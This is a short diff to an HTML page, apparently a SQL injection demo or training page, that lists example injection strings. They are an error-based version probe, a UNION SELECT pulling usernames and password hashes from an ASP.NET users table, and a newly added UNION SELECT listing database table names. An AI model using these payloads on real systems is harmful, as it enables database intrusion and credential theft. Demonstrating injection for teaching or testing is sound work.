@@ -31,6 +31,7 @@
     <ul>
         <li>' OR CAST(@@@@version as int) = 1 --</li>
         <li>' UNION SELECT CAST(CAST('[id]='+CAST([id] as nvarchar)+'|[UserName]='+[UserName]+'|[PasswordHash]='+[PasswordHash] as int)as nvarchar), NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM [AspNetUsers] --</li>
+        <li>' UNION SELECT '0', '1', '2', STUFF((select name from sys.tables FOR XML PATH('')),1,1,''), '4', '5', '6', '7', '8', '2010-10-10' --</li>
     </ul>
 </div>
 <table class="table">
